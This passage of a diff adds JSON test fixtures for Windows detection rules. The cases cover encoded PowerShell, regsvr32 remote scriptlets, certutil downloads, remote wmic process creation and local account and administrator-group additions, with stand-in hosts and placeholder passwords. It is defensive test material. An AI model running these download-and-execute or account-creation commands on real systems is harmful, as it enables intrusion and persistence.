@@ -1284,6 +1284,1770 @@
           "match": false
         }
       ]
+    },
+    {
+      "rule_id": "e7f06efa-e684-42fa-b3ed-7bbb34e6cd49",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "full_encoded_option",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "short_enc_option",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -enc SQBFAFgA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "single_e_option",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -e SQBFAFgA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "pwsh_benign_automation",
+          "event": {
+            "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "CommandLine": "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "mixed_case_option_and_image",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
+            "CommandLine": "POWERSHELL.EXE -eNcOdEdCoMmAnD SQBFAFgA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_option_boundaries",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe\t-enc\tSQBFAFgA"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "flag_at_end_no_payload_validation",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommand"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "benign_quoted_option_mention",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Write-Output ' -enc sample '\""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "different_executable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe -enc SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "powershell_ise_not_selected",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+            "CommandLine": "powershell_ise.exe -enc SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "option_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommandSuffix SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "option_prefix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe --enc SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "execution_policy_is_not_encoded",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Lab\\maintenance.ps1"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "other_abbreviation_outside_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -enco SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_flag_token_outside_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe \"-enc\" SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_image_is_invalid_profile",
+          "event": {
+            "CommandLine": "powershell.exe -enc SQBFAFgA"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_line_is_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "f3c2dcdc-d61b-422b-b2cc-de495e7c80ee",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "remote_scriptlet_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /s /n /u /i:https://example.invalid/test.sct scrobj.dll"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "http_scriptlet_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:http://example.invalid/test.sct scrobj.dll"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "explicit_unquoted_dll_path",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:https://example.invalid/test.sct C:\\Windows\\System32\\scrobj.dll"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe\t/i:https://example.invalid/test.sct\tscrobj.dll\t/u"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "mixed_case",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\REGSVR32.EXE",
+            "CommandLine": "REGSVR32.EXE /I:HTTPS://example.invalid/test.sct SCROBJ.DLL"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "benign_authorized_scriptlet_lab",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /n /i:https://lab.example.invalid/approved-test.sct scrobj.dll"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "benign_quoted_text_mention",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /? \" /i:https://example.invalid/test.sct scrobj.dll \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "ordinary_local_dll_registration",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /s C:\\ProgramData\\Vendor\\plugin.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "scrobj_without_url_option",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe scrobj.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "different_executable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "rundll32.exe /i:https://example.invalid/test.sct scrobj.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "url_option_bad_prefix",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /xi:https://example.invalid/test.sct scrobj.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "dll_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:https://example.invalid/test.sct scrobj.dll.backup"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "dll_basename_prefix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:https://example.invalid/test.sct xscrobj.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "unsupported_url_scheme",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:ftp://example.invalid/test.sct scrobj.dll"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_dll_token_outside_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32.exe /i:https://example.invalid/test.sct \"scrobj.dll\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_command_line_is_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\regsvr32.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "dc55d70f-5bbf-4b87-b72d-61e8812d8eae",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "urlcache_download_command",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f https://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "http_without_optional_flags",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache http://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "quoted_url_argument",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache \"https://example.invalid/tool.bin\" C:\\Lab\\tool.bin"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "mixed_case",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\CERTUTIL.EXE",
+            "CommandLine": "CERTUTIL.EXE -URLCACHE HTTPS://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe\t-urlcache\t-f\thttps://example.invalid/tool.bin\tC:\\Lab\\tool.bin"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "benign_admin_download",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache -f https://intranet.example.invalid/approved.cab C:\\Lab\\approved.cab"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "benign_quoted_command_mention",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -error \" -urlcache https://example.invalid/tool.bin \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "different_executable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe -urlcache https://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "cache_delete_without_http_argument",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache * delete"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "certificate_verify_different_operation",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -verify -urlfetch C:\\Lab\\certificate.cer"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "flag_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcacheSuffix https://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "flag_prefix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe --urlcache https://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "url_substring_not_argument_boundary",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache prefixhttps://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "unsupported_scheme",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache ftp://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "slash_flag_outside_explicit_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe /urlcache https://example.invalid/tool.bin C:\\Lab\\tool.bin"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_image_is_invalid_profile",
+          "event": {
+            "CommandLine": "certutil.exe -urlcache https://example.invalid/tool.bin"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "c8e15858-8742-426d-a35a-91f8d692d6ab",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "remote_process_create_command",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process call create \"cmd.exe /c echo lab\""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "quoted_node_value",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:\"LAB-HOST\" process call create notepad.exe"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "mixed_case",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\WBEM\\WMIC.EXE",
+            "CommandLine": "WMIC.EXE /NODE:LAB-HOST PROCESS CALL CREATE notepad.exe"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_separators",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe\t/node:LAB-HOST\tprocess\tcall\tcreate\tnotepad.exe"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "mixed_space_tab_separators",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process\tcall create\tnotepad.exe"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "create_at_end_no_payload_validation",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process call create"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "benign_authorized_remote_maintenance",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process call create \"cmd.exe /c echo maintenance\""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "benign_quoted_command_mention",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /? \" /node:LAB-HOST process call create notepad.exe \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "local_create_without_node",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe process call create notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "remote_query_not_create",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process get name"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "different_executable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /node:LAB-HOST process call create notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_word_order",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process create call notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "create_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process call createx notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "node_option_suffix_not_selected",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /nodeExtra:LAB-HOST process call create notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "double_separators_outside_explicit_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+            "CommandLine": "wmic.exe /node:LAB-HOST process  call create notepad.exe"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "missing_command_line_is_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\wbem\\wmic.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "1ca31074-c2d5-43e8-809e-8bf553b96ffa",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "local_user_add_at_end",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "local_user_add_before_other_option",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /add /active:yes"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "net1_supported",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net1.exe",
+            "CommandLine": "net1.exe user lab-user INERT-PASSWORD /add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "mixed_case",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\NET.EXE",
+            "CommandLine": "NET.EXE USER LAB-USER INERT-PASSWORD /ADD"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe\tuser\tlab-user\tINERT-PASSWORD\t/add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "benign_authorized_service_account",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-service INERT-PASSWORD /add /expires:never"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "benign_quoted_command_mention",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe help \" user lab-user INERT-PASSWORD /add \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "domain_user_creation_not_local",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /add /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_token_in_middle_excludes",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /domain /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_tab_boundary_excludes",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /add\t/domain\t"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "list_users_is_not_add",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "delete_is_not_add",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user /delete"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "different_executable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe user lab-user INERT-PASSWORD /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "add_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /additional"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "user_suffix_not_a_token",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe username lab-user INERT-PASSWORD /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_add_token_outside_coverage",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD \"/add\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_substring_is_not_domain_switch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe user lab-user INERT-PASSWORD /add /domainSuffix"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "missing_command_line_is_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "a9663284-70f8-4f69-ae3e-f829f396fc72",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "local_administrators_add_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "legitimate_maintenance_membership_add",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators maintenance-user /add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "net1_quoted_group_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net1.exe",
+            "CommandLine": "net1.exe localgroup \"Administrators\" alice /add"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "uppercase_candidate",
+          "event": {
+            "Image": "C:\\WINDOWS\\SYSTEM32\\NET.EXE",
+            "CommandLine": "NET.EXE LOCALGROUP ADMINISTRATORS ALICE /ADD"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "tab_boundaries_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe\tlocalgroup\tAdministrators\talice\t/add\t"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "trailing_switch_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /add /comment:lab"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "group_listing_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "membership_removal_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /delete"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "other_group_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Users alice /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "group_name_suffix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup AdministratorsBackup alice /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "add_token_suffix_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /additional"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "domain_operation_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /add /domain"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_domain_operation_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /add \"/domain\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "wrong_executable_nonmatch",
+          "event": {
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "net.exe localgroup Administrators alice /add"
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "quoted_add_token_outside_scope",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe localgroup Administrators alice \"/add\""
+          },
+          "match": false,
+          "profile_valid": true,
+          "outcome": "nonmatch"
+        },
+        {
+          "name": "benign_quoted_command_mention_remains_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe help \" localgroup Administrators alice /add \""
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "benign_candidate"
+        },
+        {
+          "name": "missing_image_invalid_profile",
+          "event": {
+            "CommandLine": "net.exe localgroup Administrators alice /add"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        },
+        {
+          "name": "missing_command_invalid_profile",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe"
+          },
+          "match": false,
+          "profile_valid": false,
+          "outcome": "invalid_profile"
+        }
+      ]
+    },
+    {
+      "rule_id": "89c24b29-3726-4e2e-b663-cc98ca5b8b54",
+      "source": {
+        "product": "windows",
+        "category": "process_creation"
+      },
+      "cases": [
+        {
+          "name": "domain_computer_listing_candidate",
+          "event": {
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe view /domain:LAB"
+          },
+          "match": true,
+          "profile_valid": true,
+          "outcome": "candidate"
+        },
+        {
+          "name": "legitimate_asset_inventory_candidate",
+          "event": {
